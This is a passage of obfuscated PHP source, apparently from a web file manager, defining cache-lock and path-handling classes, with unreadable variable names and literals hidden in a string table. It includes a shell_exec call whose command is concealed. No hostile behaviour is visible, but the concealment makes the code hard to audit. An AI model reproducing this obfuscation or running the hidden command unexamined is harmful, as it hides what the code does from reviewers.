init() { $ÏäóÇ³À =& $_SERVER[ÔÕ±ĞšÎ]; if (self::$handle) { return self::$handle; } $à¨»¤›® = $GLOBALS[$ÏäóÇ³À[6]][$ÏäóÇ³À[426]]; self::$timeout = $à¨»¤›®[$ÏäóÇ³À[915]] ? $à¨»¤›®[$ÏäóÇ³À[915]] : 10; $™ñù®° = _get($GLOBALS[$ÏäóÇ³À[6]], $ÏäóÇ³À[916]); $ÔÁ¨°ëµ = $à¨»¤›®[$ÏäóÇ³À[901]] ? $à¨»¤›®[$ÏäóÇ³À[901]] : $ÏäóÇ³À[232]; if ($ÔÁ¨°ëµ == $ÏäóÇ³À[21] && $™ñù®° == $ÏäóÇ³À[13]) { $ÔÁ¨°ëµ = $ÏäóÇ³À[232]; } switch ($ÔÁ¨°ëµ) { case $ÏäóÇ³À[904]: self::$handle = new CacheLockRedis(); break; case $ÏäóÇ³À[905]: self::$handle = new CacheLockMemcached(); break; case $ÏäóÇ³À[21]: self::$handle = new CacheLockDatabase(); break; case $ÏäóÇ³À[232]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($ÏäóÇ³À[917], $ÏäóÇ³À[918]); } return self::$handle; } private static function key($Ü˜´È) { return $_SERVER[ÔÕ±ĞšÎ][919] . Cache::key($Ü˜´È); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($¢¡ÁÕüÆ = '') { self::$errorMsg = $¢¡ÁÕüÆ; } public static function lockGlobal($·µÑ•¤ã, $¥õ¾èî) { return self::lock($·µÑ•¤ã, $¥õ¾èî, !0); } public static function lock($ûîÃ´£, $ìƒîá¿§ = false, $¢Ğš¨½ = false) { $‰Éé±îª =& $_SERVER[ÔÕ±ĞšÎ]; $¡×œ€ëƒ = self::init(); $ŒŒ¾âù = self::key($ûîÃ´£); $ìƒîá¿§ = $ìƒîá¿§ ? $ìƒîá¿§ : self::$timeout; $à€À¤óÇ = timeFloat(); if ($GLOBALS[$‰Éé±îª[920]]) { if (!$¡×œ€ëƒ->lock($ŒŒ¾âù, 0.2)) { die; } return !0; } $¨øËÊ–ü = $¡×œ€ëƒ->lock($ŒŒ¾âù, $ìƒîá¿§); $Å©¼¡‹Ë = timeFloat(); if (!$¨øËÊ–ü) { $Ú‹¬şŞó = "\x6c\157\143\x6b\x20\x65\162\162\x6f\162\x3b\153\x65\x79\75{$ûîÃ´£}\x3b\x74\x69\155\145\x3d{$ìƒîá¿§}\x3b" . self::$errorMsg . $‰Éé±îª[74] . get_caller_msg(); $ş¿İ„ÓÁ = LNG($‰Éé±îª[921]) . "\x28{$ìƒîá¿§}\x73\x29\56" . LNG($‰Éé±îª[922]); $ş¿İ„ÓÁ .= $‰Éé±îª[923]; if (is_string(self::$errorMsg) && self::$errorMsg) { $ş¿İ„ÓÁ = $ş¿İ„ÓÁ . $‰Éé±îª[924] . self::$errorMsg; } write_log($‰Éé±îª[925] . sprintf($‰Éé±îª[926], timeFloat() - $à€À¤óÇ) . $‰Éé±îª[927] . $Ú‹¬şŞó . $‰Éé±îª[928] . json_encode(error_get_last()), $‰Éé±îª[918]); show_json($ş¿İ„ÓÁ, !1); } if (!$¢Ğš¨½) { self::$lockItem[$ŒŒ¾âù] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $¶—¢ö¸÷ = number_format(timeFloat() - $Å©¼¡‹Ë, 3); write_log($‰Éé±îª[929] . $ûîÃ´£ . $‰Éé±îª[930] . $¶—¢ö¸÷, $‰Éé±îª[918]); } return $¨øËÊ–ü; } public static function lockGet($¬ÈÚù‰Ö) { $Õ©æÎÉŸ = self::key($¬ÈÚù‰Ö); if (self::$lockItem[$Õ©æÎÉŸ]) { return self::$lockItem[$Õ©æÎÉŸ]; } return self::init()->lockGet($Õ©æÎÉŸ); } public static function unlock($·†¡Ì˜•) { $†®™Äû… =& $_SERVER[ÔÕ±ĞšÎ]; $ØšÖß®µ = self::key($·†¡Ì˜•); self::$lockItem[$ØšÖß®µ] = null; self::init()->unlock($ØšÖß®µ); if (GLOBAL_DEBUG_LOG_ALL) { write_log($†®™Äû…[931] . $·†¡Ì˜•, $†®™Äû…[918]); } return; } public static function unlockRuntime() { $ÙşŞÓóá =& $_SERVER[ÔÕ±ĞšÎ]; $ê®úöÅõ = self::init(); $¢Ãğˆ® = !1; foreach (self::$lockItem as $Ğ±½Â° => $ÖÆÅ›«ª) { if (!$ÖÆÅ›«ª) { continue; } $ê®úöÅõ->unlock($Ğ±½Â°); if (!$¢Ãğˆ®) { $¢Ãğˆ® = !0; write_log($ÙşŞÓóá[932] . $Ğ±½Â° . $ÙşŞÓóá[74] . get_caller_msg(), $ÙşŞÓóá[918]); continue; } write_log($ÙşŞÓóá[932] . $Ğ±½Â°, $ÙşŞÓóá[918]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $ÌºöÇï« = number_format(timeFloat() - TIME_FLOAT, 3); write_log($ÙşŞÓóá[933] . $ÌºöÇï« . $ÙşŞÓóá[934] . ACTION, $ÙşŞÓóá[918]); } } public static function fileLock($æë™´›) { $äàÄøËş =& $_SERVER[ÔÕ±ĞšÎ]; if (!$GLOBALS[$äàÄøËş[935]]) { $GLOBALS[$äàÄøËş[935]] = array(); } $GLOBALS[$äàÄøËş[935]][$æë™´›] = !1; $Ş—µ½ˆ§ = fopen(DATA_PATH . $æë™´› . $äàÄøËş[936], $äàÄøËş[937]); if (!$Ş—µ½ˆ§) { return !1; } $GLOBALS[$äàÄøËş[935]][$æë™´›] = $Ş—µ½ˆ§; if (flock($Ş—µ½ˆ§, LOCK_EX)) { return !0; } self::unlock($æë™´›); show_json($äàÄøËş[938], !1); return !1; } public static function fileUnlock($şŸì»ø) { $Ëôşßõ =& $_SERVER[ÔÕ±ĞšÎ]; $ò­ªœ½û = $GLOBALS[$Ëôşßõ[935]][$şŸì»ø]; if (!$ò­ªœ½û) { return; } $GLOBALS[$Ëôşßõ[935]][$şŸì»ø] = !1; flock($ò­ªœ½û, LOCK_UN); fclose($ò­ªœ½û); } public static function fileUnlockAll() { $ô²˜ªø =& $_SERVER[ÔÕ±ĞšÎ]; if (!isset($GLOBALS[$ô²˜ªø[935]]) || !$GLOBALS[$ô²˜ªø[935]]) { return; } foreach ($GLOBALS[$ô²˜ªø[935]] as $¥ÓË¶¢± => $‹œ®Ş¢÷) { if (!$‹œ®Ş¢÷) { continue; } $GLOBALS[$ô²˜ªø[935]][$¥ÓË¶¢±] = !1; flock($‹œ®Ş¢÷, LOCK_UN); fclose($‹œ®Ş¢÷); } $GLOBALS[$ô²˜ªø[935]] = array(); } } goto EåŠ¡Äö; A¬ ¤äÀ¨Ê: class KodIO { const KOD_SOURCE = "\173\x73\157\165\162\143\x65\x7d"; const KOD_USER_RECYCLE = "\x7b\165\163\x65\x72\x52\x65\x63\171\143\x6c\145\175"; const KOD_USER_FAV = "\x7b\165\x73\x65\162\106\141\x76\175"; const KOD_USER_FILE_TAG = "\173\165\x73\x65\x72\106\x69\x6c\x65\x54\141\147\175"; const KOD_USER_FILE_TYPE = "\173\165\x73\x65\162\x46\151\154\x65\124\x79\160\145\175"; const KOD_GROUP_ROOT_SELF = "\x7b\x67\162\157\x75\x70\x52\157\x6f\x74\123\145\x6c\x66\175"; const KOD_USER_SHARE = "\x7b\165\x73\145\x72\x53\150\x61\162\145\x7d"; const KOD_USER_SHARE_LINK = "\x7b\x75\x73\x65\162\123\x68\141\x72\145\x4c\151\x6e\153\175"; const KOD_USER_SHARE_TO_ME = "\173\x73\x68\141\x72\x65\124\x6f\115\145\x7d"; const KOD_SHARE_ITEM = "\173\163\x68\141\x72\145\x49\x74\x65\x6d\x7d"; const KOD_SHARE_LINK = "\173\x73\x68\x61\162\145\x49\x74\x65\x6d\114\x69\x6e\x6b\175"; const KOD_SEARCH = "\173\163\145\x61\x72\x63\x68\x7d"; const KOD_BLOCK = "\x7b\142\x6c\157\x63\x6b\x7d"; const KOD_IO = "\x7b\x69\157\x7d"; const KOD_USER_RECENT = "\173\x75\163\145\x72\122\145\156\143\x65\156\x74\175"; const KOD_USER_DRIVER = "\x7b\x64\162\151\x76\145\x72\175"; public static function typeList() { $Ş„¡ßÛ =& $_SERVER[ÔÕ±ĞšÎ]; return array($Ş„¡ßÛ[1338] => self::KOD_SOURCE, $Ş„¡ßÛ[1339] => self::KOD_USER_RECYCLE, $Ş„¡ßÛ[1340] => self::KOD_USER_FAV, $Ş„¡ßÛ[1341] => self::KOD_USER_FILE_TAG, $Ş„¡ßÛ[1342] => self::KOD_USER_FILE_TYPE, $Ş„¡ßÛ[1343] => self::KOD_GROUP_ROOT_SELF, $Ş„¡ßÛ[1344] => self::KOD_USER_SHARE, $Ş„¡ßÛ[1345] => self::KOD_USER_SHARE_LINK, $Ş„¡ßÛ[1346] => self::KOD_USER_SHARE_TO_ME, $Ş„¡ßÛ[1347] => self::KOD_SHARE_ITEM, $Ş„¡ßÛ[1348] => self::KOD_SHARE_LINK, $Ş„¡ßÛ[1349] => self::KOD_SEARCH, $Ş„¡ßÛ[1350] => self::KOD_BLOCK, $Ş„¡ßÛ[1351] => self::KOD_IO, $Ş„¡ßÛ[1352] => self::KOD_USER_RECENT, $Ş„¡ßÛ[1353] => self::KOD_USER_DRIVER); } public static function parse($È¨‡µƒ) { $¹íƒï³¥ =& $_SERVER[ÔÕ±ĞšÎ]; $È¨‡µƒ = self::clear($È¨‡µƒ); $ŒÃ®Ó£ = array_values(self::typeList()); preg_match($¹íƒï³¥[1354], $È¨‡µƒ, $¢’”¬€ö); $ªªê»† = array($¹íƒï³¥[498] => !1, $¹íƒï³¥[1355] => !1, $¹íƒï³¥[495] => !1, $¹íƒï³¥[87] => $È¨‡µƒ, $¹íƒï³¥[1253] => !1, $¹íƒï³¥[1252] => $¹íƒï³¥[12]); if (is_array($¢’”¬€ö) && count($¢’”¬€ö) == 5) { $½Ñéí = $¹íƒï³¥[1356] . $¢’”¬€ö[2] . $¹íƒï³¥[404]; if (in_array($½Ñéí, $ŒÃ®Ó£)) { $ªªê»†[$¹íƒï³¥[1253]] = $¢’”¬€ö[1]; $ªªê»†[$¹íƒï³¥[33]] = $½Ñéí; $ªªê»†[$¹íƒï³¥[1357]] = substr($½Ñéí, 1, -1); $ªªê»†[$¹íƒï³¥[477]] = $¢’”¬€ö[3]; } $ªªê»†[$¹íƒï³¥[1252]] = $¢’”¬€ö[4]; } $±‚ÖÒ½ò = array($¹íƒï³¥[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $ªªê»†[$¹íƒï³¥[1320]] = in_array($ªªê»†[$¹íƒï³¥[33]], $±‚ÖÒ½ò); return $ªªê»†; } public static function isTruePath($Ë©êÚú¥) { $òÃùÙ… =& $_SERVER[ÔÕ±ĞšÎ]; if (substr($Ë©êÚú¥, 0, 1) != $òÃùÙ…[1356]) { return !0; } if (strpos($Ë©êÚú¥, $òÃùÙ…[485]) === 0) { return !0; } if (strpos($Ë©êÚú¥, $òÃùÙ…[1324]) === 0) { return !0; } if (strpos($Ë©êÚú¥, $òÃùÙ…[1358]) === 0) { return !0; } if (strpos($Ë©êÚú¥, $òÃùÙ…[1359]) === 0) { return !0; } if (strpos($Ë©êÚú¥, $òÃùÙ…[1360]) === 0) { return !0; } return !1; } public static function clear($ëâ½€“·) { $ìñ§Ì¸Ñ =& $_SERVER[ÔÕ±ĞšÎ]; $ëâ½€“· = str_replace(array($ìñ§Ì¸Ñ[1158], $ìñ§Ì¸Ñ[287]), $ìñ§Ì¸Ñ[53], $ëâ½€“·); $ëâ½€“· = str_replace($ìñ§Ì¸Ñ[100], $ìñ§Ì¸Ñ[8], $ëâ½€“·); $Ú–÷óıƒ = $ìñ§Ì¸Ñ[1361]; if (substr($ëâ½€“·, 0, 3) == $ìñ§Ì¸Ñ[1362]) { $ëâ½€“· = substr($ëâ½€“·, 3); } while (strstr($ëâ½€“·, $Ú–÷óıƒ)) { $ëâ½€“· = str_replace($Ú–÷óıƒ, $ìñ§Ì¸Ñ[8], $ëâ½€“·); } $ëâ½€“· = preg_replace($ìñ§Ì¸Ñ[1363], $ìñ§Ì¸Ñ[8], $ëâ½€“·); if ($ëâ½€“· == $ìñ§Ì¸Ñ[8]) { return $ìñ§Ì¸Ñ[8]; } $ëâ½€“· = rtrim($ëâ½€“·, $ìñ§Ì¸Ñ[8]); return $ëâ½€“·; } public static function pathTrue($Ï¤´¿ÍÛ) { $ûµ„àã =& $_SERVER[ÔÕ±ĞšÎ]; if (!$Ï¤´¿ÍÛ) { return $ûµ„àã[12]; } $Ï¤´¿ÍÛ = str_replace($ûµ„àã[256], $ûµ„àã[8], str_replace($ûµ„àã[1364], $ûµ„àã[8], $Ï¤´¿ÍÛ)); $Ï¤´¿ÍÛ = str_replace($ûµ„àã[256], $ûµ„àã[8], str_replace($ûµ„àã[1364], $ûµ„àã[8], $Ï¤´¿ÍÛ)); if (!strstr($Ï¤´¿ÍÛ, $ûµ„àã[1362])) { return $Ï¤´¿ÍÛ; } $ÜÉßâ = explode($ûµ„àã[8], $Ï¤´¿ÍÛ); foreach ($ÜÉßâ as $ÀàŠ¬ƒ… => $÷¼÷‹‘Æ) { if ($÷¼÷‹‘Æ !== $ûµ„àã[1365]) { continue; } for ($ô¸Àğñ = $ÀàŠ¬ƒ…; $ô¸Àğñ >= 0; $ô¸Àğñ--) { if ($ÜÉßâ[$ô¸Àğñ] === $ûµ„àã[10] || $ÜÉßâ[$ô¸Àğñ] === $ûµ„àã[1365] || $ÜÉßâ[$ô¸Àğñ] === -1) { continue; } if ($ÜÉßâ[$ô¸Àğñ] === $ûµ„àã[12]) { $ÜÉßâ[$ÀàŠ¬ƒ…] = -1; break; } $ÜÉßâ[$ÀàŠ¬ƒ…] = -1; $ÜÉßâ[$ô¸Àğñ] = -1; break; } } $úÂ¬Ë™Û = array(); foreach ($ÜÉßâ as $÷¼÷‹‘Æ) { if ($÷¼÷‹‘Æ !== -1) { $úÂ¬Ë™Û[] = $÷¼÷‹‘Æ; } } $¡ÔËØÃã = implode($ûµ„àã[8], $úÂ¬Ë™Û); if (strpos($¡ÔËØÃã, $ûµ„àã[1366]) === 0) { $¡ÔËØÃã = $ûµ„àã[1362] . substr($¡ÔËØÃã, strlen($ûµ„àã[1366])); } return $¡ÔËØÃã; } public static function pathUrlClear($°ƒ˜†Š) { $üì¨´ƒ» =& $_SERVER[ÔÕ±ĞšÎ]; if (!$°ƒ˜†Š) { return $°ƒ˜†Š; } $°ƒ˜†Š = rawurldecode($°ƒ˜†Š); $°ƒ˜†Š = str_replace($üì¨´ƒ»[1364], $üì¨´ƒ»[8], $°ƒ˜†Š); if (strpos($°ƒ˜†Š, $üì¨´ƒ»[76]) > 0) { $°ƒ˜†Š = substr($°ƒ˜†Š, 0, strpos($°ƒ˜†Š, $üì¨´ƒ»[76])); } if (strpos($°ƒ˜†Š, $üì¨´ƒ»[1367]) > 0) { $°ƒ˜†Š = substr($°ƒ˜†Š, 0, strpos($°ƒ˜†Š, $üì¨´ƒ»[1367])); } return $°ƒ˜†Š; } public static function sourceID($óëƒÂÚœ) { $ä©§ş“¼ =& $_SERVER[ÔÕ±ĞšÎ]; $Ê—Ã¾ñå = self::parse($óëƒÂÚœ); if ($Ê—Ã¾ñå[$ä©§ş“¼[33]] !== self::KOD_SOURCE) { show_json(LNG($ä©§ş“¼[1368]), !1); } return $Ê—Ã¾ñå[$ä©§ş“¼[477]]; } public static function make($ş†Ü–¢) { if (!$ş†Ü–¢) { return !1; } return self::makePath(self::KOD_SOURCE, intval($ş†Ü–¢)); } public static function makeShare($»Áïİ™ë, $®ş±”ˆî) { return self::makePath(self::KOD_SHARE_ITEM, $»Áïİ™ë, $®ş±”ˆî); } public static function makeFileTypePath($È´¤ßÎ) { return self::makePath(self::KOD_USER_FILE_TYPE, $È´¤ßÎ); } public static function makeFileTagPath($ùßßÛë…) { return self::makePath(self::KOD_USER_FILE_TAG, $ùßßÛë…); } public static function makePath($§Şà¹®Ÿ, $‰§Åí = '', $ìÍ¶•‰ä = '') { $„Ü”çğĞ =& $_SERVER[ÔÕ±ĞšÎ]; $óíÃãÃ‹ = substr($§Şà¹®Ÿ, 1, -1); $êƒ”è– = $„Ü”çğĞ[1369] . $óíÃãÃ‹ . $„Ü”çğĞ[1370] . $‰§Åí . $„Ü”çğĞ[1371]; $êƒ”è– = $ìÍ¶•‰ä ? $êƒ”è– . $ìÍ¶•‰ä . $„Ü”çğĞ[8] : $êƒ”è–; return $êƒ”è–; } public static function hashPath($Ê½×ºİ, $Œ×¿´—î = true) { $Ê‚íæ§Æ =& $_SERVER[ÔÕ±ĞšÎ]; $áÅØ¼ÈÌ = is_array($Ê½×ºİ) ? $Ê½×ºİ : IO::info($Ê½×ºİ); $ö…•öÁû = _get($áÅØ¼ÈÌ, $Ê‚íæ§Æ[1372], $Ê‚íæ§Æ[12]); if (!$ö…•öÁû && isset($áÅØ¼ÈÌ[$Ê‚íæ§Æ[237]])) { $ö…•öÁû = trim($áÅØ¼ÈÌ[$Ê‚íæ§Æ[237]], $Ê‚íæ§Æ[121]); } if (!$ö…•öÁû && isset($áÅØ¼ÈÌ[$Ê‚íæ§Æ[193]]) && $áÅØ¼ÈÌ[$Ê‚íæ§Æ[193]]) { $áÅØ¼ÈÌ = IO::info(KodIO::make($áÅØ¼ÈÌ[$Ê‚íæ§Æ[193]])); $ö…•öÁû = _get($áÅØ¼ÈÌ, $Ê‚íæ§Æ[1372], $Ê‚íæ§Æ[12]); } $º°ö¬üù = md5($áÅØ¼ÈÌ[$Ê‚íæ§Æ[87]] . $áÅØ¼ÈÌ[$Ê‚íæ§Æ[79]] . $áÅØ¼ÈÌ[$Ê‚íæ§Æ[88]]); if (!$ö…•öÁû && file_exists($áÅØ¼ÈÌ[$Ê‚íæ§Æ[87]])) { $ö…•öÁû = Cache::get($º°ö¬üù . $Ê‚íæ§Æ[1373]); $ö…•öÁû = !1; if (!$ö…•öÁû) { $ö…•öÁû = IO::hashSimple($áÅØ¼ÈÌ[$Ê‚íæ§Æ[87]]); Cache::set($º°ö¬üù . $Ê‚íæ§Æ[1373], $ö…•öÁû, 3600 * 24 * 30); } } if ($Œ×¿´—î && !$ö…•öÁû) { } return $ö…•öÁû ? $ö…•öÁû : $º°ö¬üù; } public static function hashPathSafe($°ÇË×Ö, $ş›¯»­ = true) { $œ¬ŞäÙ” =& $_SERVER[ÔÕ±ĞšÎ]; $úìîí¤¬ = self::hashPath($°ÇË×Ö, $ş›¯»­); return md5($úìîí¤¬ . $œ¬ŞäÙ”[1374] . Model($œ¬ŞäÙ”[844])->get($œ¬ŞäÙ”[845])); } public static function initSystemPath() { $ø‡ÈÀ… =& $_SERVER[ÔÕ±ĞšÎ]; if (defined($ø‡ÈÀ…[1375])) { return; } define($ø‡ÈÀ…[1375], self::systemPath($ø‡ÈÀ…[191])); define($ø‡ÈÀ…[1376], self::systemPath($ø‡ÈÀ…[1377])); define($ø‡ÈÀ…[1378], self::systemPath($ø‡ÈÀ…[1379])); define($ø‡ÈÀ…[1380], self::systemPath($ø‡ÈÀ…[1381])); IOHistory::bindEvent(); } public static function systemPath($Çµ“±½é) { $ªÒãä‰Ç =& $_SERVER[ÔÕ±ĞšÎ]; $„èÎ úã = $ªÒãä‰Ç[1382] . ucfirst($Çµ“±½é); $Å¸¼Ë÷ü = Model($ªÒãä‰Ç[844])->get($„èÎ úã); if ($Å¸¼Ë÷ü) { return $Å¸¼Ë÷ü; } if ($Çµ“±½é == $ªÒãä‰Ç[191]) { $Å¸¼Ë÷ü = self::make(Model($ªÒãä‰Ç[899])->systemRootPathAdd($ªÒãä‰Ç[610])); } else { $Å¸¼Ë÷ü = self::systemPath($ªÒãä‰Ç[191]); $Šä˜•—Ë = self::sourceID($Å¸¼Ë÷ü); $Å¸¼Ë÷ü = self::make(Model($ªÒãä‰Ç[899])->mkdir($Šä˜•—Ë, $Çµ“±½é)); } Model($ªÒãä‰Ç[844])->set($„èÎ úã, $Å¸¼Ë÷ü); return $Å¸¼Ë÷ü; } public static function systemFolder($Ñ¿›ÍÒ½) { $Ğá°«ñŒ = IO_PATH_SYSTEM_SOURCE . $Ñ¿›ÍÒ½; $½¹¨Ù± = Cache::get($Ğá°«ñŒ); if (!$½¹¨Ù±) { $ıÀ÷ßı× = IO::infoFullSimple($Ğá°«ñŒ); if (!$ıÀ÷ßı×) { $½¹¨Ù± = IO::mkdir($Ğá°«ñŒ, REPEAT_SKIP); } else { $½¹¨Ù± = $ıÀ÷ßı×[$_SERVER[ÔÕ±ĞšÎ][87]]; } Cache::set($Ğá°«ñŒ, $½¹¨Ù±, 3600 * 10); } return $½¹¨Ù±; } public static function defaultDriver() { return Model($_SERVER[ÔÕ±ĞšÎ][841])->defaultDriver(); } public static function defaultIO() { $¸ğûĞ =& $_SERVER[ÔÕ±ĞšÎ]; $™”ïçˆ = self::defaultDriver(); return $¸ğûĞ[1383] . $™”ïçˆ[$¸ğûĞ[477]] . $¸ğûĞ[1371]; } public static function defaultDriverInit() { static $æ»îãáò = false; if ($æ»îãáò) { return $æ»îãáò; } $æ»îãáò = IO::init(self::defaultIO()); return $æ»îãáò; } public static function fileTypeList() { $ÈŠè  =& $_SERVER[ÔÕ±ĞšÎ]; $ÊÓĞåŞ‡ = $GLOBALS[$ÈŠè [6]][$ÈŠè [1384]]; foreach ($ÊÓĞåŞ‡ as $š«ÂÈÛ => $ã¯Î¬…¤) { $‚Àïéö = $ÈŠè [1385] . $š«ÂÈÛ; $şŒÆ¬ñù = LNG($‚Àïéö); if ($‚Àïéö != $şŒÆ¬ñù) { $ÊÓĞåŞ‡[$š«ÂÈÛ][$ÈŠè [32]] = $şŒÆ¬ñù; } } return $ÊÓĞåŞ‡; } public static function diskList($¬«¶Ø½Ÿ = true) { $ŞÓÎÛ‡ö = $_SERVER[ÔÕ±ĞšÎ][1386]; if ($¬«¶Ø½Ÿ) { $àÚÛèÆ = Cache::get($ŞÓÎÛ‡ö); if (is_array($àÚÛèÆ)) { return $àÚÛèÆ; } } $àÚÛèÆ = self::diskListGet(); Cache::set($ŞÓÎÛ‡ö, $àÚÛèÆ, 60); return $àÚÛèÆ; } public static function diskListGet() { $½ì´úÔı =& $_SERVER[ÔÕ±ĞšÎ]; $ªŠéãô» = array(); if ($GLOBALS[$½ì´úÔı[6]][$½ì´úÔı[1387]] == $½ì´úÔı[1388]) { $Şãê¶ø = $½ì´úÔı[1389]; for ($¢¾…úıË = 0; $¢¾…úıË < strlen($Şãê¶ø); $¢¾…úıË++) { $ßìÇ¤¤ = $Şãê¶ø[$¢¾…úıË] . $½ì´úÔı[1390]; if (file_exists($ßìÇ¤¤)) { $ªŠéãô»[] = $ßìÇ¤¤; } } return $ªŠéãô»; } if (!function_exists($½ì´úÔı[101])) { $ªŠéãô»[] = $½ì´úÔı[910]; return $ªŠéãô»; } $§øÎã¨š = explode($½ì´úÔı[287], shell_exec($½ì´úÔı[1391])); array_shift($§øÎã¨š); array_pop($§øÎã¨š); $‚›â¿ = array($½ì´úÔı[1392], $½ì´úÔı[1393], $½ì´úÔı[1394], $½ì´úÔı[1395], $½ì´úÔı[1396], $½ì´úÔı[1397], $½ì´úÔı[1398], $½ì´úÔı[1399]); foreach ($§øÎã¨š as $÷Ó†˜è) { $‚’ñ…°Õ = preg_split($½ì´úÔı[1400], $÷Ó†˜è); $ßìÇ¤¤ = $‚’ñ…°Õ[count($‚’ñ…°Õ) - 1]; if (!strstr($‚’ñ…°Õ[0], $½ì´úÔı[1401]) || !$ßìÇ¤¤) { continue; } $òî×ûéÉ = rtrim($ßìÇ¤¤, $½ì´úÔı[8]) . $½ì´úÔı[8]; if (in_array($òî×ûéÉ, $‚›â¿)) { continue; } $ªŠéãô»[] = $òî×ûéÉ; } return $ªŠéãô»; } public static function isSameDisk($ªŠƒü² , $ĞÌ˜¾‚) { $š‰Ùµãğ =& $_SERVER[ÔÕ±ĞšÎ]; if ($GLOBALS[$š‰Ùµãğ[6]][$š‰Ùµãğ[1387]] == $š‰Ùµãğ[1388]) { return strtolower(substr($ªŠƒü² , 0, 1)) == strtolower(substr($ĞÌ˜¾‚, 0, 1)); } $Îõà›ìÚ = stat($ªŠƒü² ); $¶òÓÜ = stat($ĞÌ˜¾‚); if ($Îõà›ìÚ === !1 || $¶òÓÜ === !1) { return !1; } return $Îõà›ìÚ[$š‰Ùµãğ[1402]] === $¶òÓÜ[$š‰Ùµãğ[1402]]; $¡‹™€£œ = self::diskList(); $ÀïŞ÷“ç = !1; $æ­‰§áØ = !1; sort($¡‹™€£œ); $¡‹™€£œ = array_reverse($¡‹™€£œ); $ªŠƒü²  = rtrim($ªŠƒü² , $š‰Ùµãğ[8]) . $š‰Ùµãğ[8]; $ĞÌ˜¾‚ = rtrim($ĞÌ˜¾‚, $š‰Ùµãğ[8]) . $š‰Ùµãğ[8]; foreach ($¡‹™€£œ as $ÉøñŞ ) { $ºÊŒ†ıì = strlen($ÉøñŞ ); if (!$ÀïŞ÷“ç && substr($ªŠƒü² , 0, $ºÊŒ†ıì) == $ÉøñŞ ) { $ÀïŞ÷“ç = $ÉøñŞ ; } if (!$æ­‰§áØ && substr($ĞÌ˜¾‚, 0, $ºÊŒ†ıì) == $ÉøñŞ ) { $æ­‰§áØ = $ÉøñŞ ; } if ($ÀïŞ÷“ç && $æ­‰§áØ) { break; } } return $ÀïŞ÷“ç === $æ­‰§áØ; } public static function transferType($ÌÈ½²Ú², $ï©­ÂÑÈ) { $æ¤ññ¯ì =& $_SERVER[ÔÕ±ĞšÎ]; $™Å·²‰ = self::driverType($ÌÈ½²Ú²); $½´«ŞÚï = self::driverType($ï©­ÂÑÈ); if ($™Å·²‰[$æ¤ññ¯ì[33]] == $½´«ŞÚï[$æ¤ññ¯ì[33]] && $™Å·²‰[$æ¤ññ¯ì[1403]] == $½´«ŞÚï[$æ¤ññ¯ì[1403]]) { return $æ¤ññ¯ì[1404]; } if ($™Å·²‰[$æ¤ññ¯ì[33]] == $æ¤ññ¯ì[944] && $½´«ŞÚï[$æ¤ññ¯ì[33]] == $æ¤ññ¯ì[109]) { return $æ¤ññ¯ì[1281]; } if ($™Å·²‰[$æ¤ññ¯ì[33]] == $æ¤ññ¯ì[109] && $½´«ŞÚï[$æ¤ññ¯ì[33]] == $æ¤ññ¯ì[944]) { return $æ¤ññ¯ì[110]; } return $æ¤ññ¯ì[1405]; } public static function driverType($÷‰Ş¤“›) { $‹òØµ±ï =& $_SERVER[ÔÕ±ĞšÎ]; $¹íÉÍŠÖ = str_replace($‹òØµ±ï[1406], $‹òØµ±ï[12], strtolower($÷‰Ş¤“›->getType())); if ($¹íÉÍŠÖ == $‹òØµ±ï[831] || $¹íÉÍŠÖ == $‹òØµ±ï[1407] || $¹íÉÍŠÖ == $‹òØµ±ï[1408]) { $÷‰Ş¤“› = self::defaultDriverInit(); } else { if ($¹íÉÍŠÖ == $‹òØµ±ï[1291] || $¹íÉÍŠÖ == $‹òØµ±ï[1409]) { $÷‰Ş¤“› = IO::init($÷‰Ş¤“›->pathParse[$‹òØµ±ï[1234]]); } } $‡±ÊÉŒ = $÷‰Ş¤“›->path; $¹íÉÍŠÖ = str_replace($‹òØµ±ï[1406], $‹òØµ±ï[12], strtolower($÷‰Ş¤“›->getType())); if ($¹íÉÍŠÖ == $‹òØµ±ï[109]) { return array($‹òØµ±ï[33] => $‹òØµ±ï[109], $‹òØµ±ï[1403] => $‹òØµ±ï[12], $‹òØµ±ï[87] => $‡±ÊÉŒ, $‹òØµ±ï[98] => $÷‰Ş¤“›); } return array($‹òØµ±ï[33] => $‹òØµ±ï[944], $‹òØµ±ï[1403] => $÷‰Ş¤“›->pathDriver, $‹òØµ±ï[87] => $‡±ÊÉŒ, $‹òØµ±ï[98] => $÷‰Ş¤“›); } public static function pathDriverType($Á¿ÜÊİŸ) { return $Á¿ÜÊİŸ ? self::driverType(IO::init($Á¿ÜÊİŸ)) : !1; } public static function pathDriverLocal($© ¿Ùä£) { $õ¢°‰ï‹ =& $_SERVER[ÔÕ±ĞšÎ]; $—şàÔ£ì = $© ¿Ùä£ ? self::driverType(IO::init($© ¿Ùä£)) : !1; return strtolower($—şàÔ£ì[$õ¢°‰ï‹[33]]) == $õ¢°‰ï‹[109] ? !0 : !1; } public static function allowCover($õ¶¨»ª, $• Ã©Ûş = true) { $ˆü¥Š± =& $_SERVER[ÔÕ±ĞšÎ]; if (is_string($õ¶¨»ª)) { $õ¶¨»ª = IO::info($õ¶¨»ª); } if (!$õ¶¨»ª || $õ¶¨»ª[$ˆü¥Š±[33]] == $ˆü¥Š±[78] || $õ¶¨»ª[$ˆü¥Š±[79]] <= 100) { return !1; } if (isset($õ¶¨»ª[$ˆü¥Š±[1410]]) || !$õ¶¨»ª[$ˆü¥Š±[87]]) { return !1; } if (isset($õ¶¨»ª[$ˆü¥Š±[234]]) && !$õ¶¨»ª[$ˆü¥Š±[234]]) { return !1; } static $ğŠÕè¯£ = false; if (!$ğŠÕè¯£ || !$• Ã©Ûş) { $Úõ³şçñ = self::driverType(IO::init($õ¶¨»ª[$ˆü¥Š±[87]])); $ßÍÃˆ‘› = $Úõ³şçñ[$ˆü¥Š±[98]]; $ğŠÕè¯£ = $ˆü¥Š±[196]; if ($Úõ³şçñ[$ˆü¥Š±[33]] == $ˆü¥Š±[109]) { $ğŠÕè¯£ = $ˆü¥Š±[1411]; } if ($Úõ³şçñ[$ˆü¥Š±[98]] && is_array($Úõ³şçñ[$ˆü¥Š±[98]]->config)) { $‹å“ª×í = $Úõ³şçñ[$ˆü¥Š±[98]]->config; if 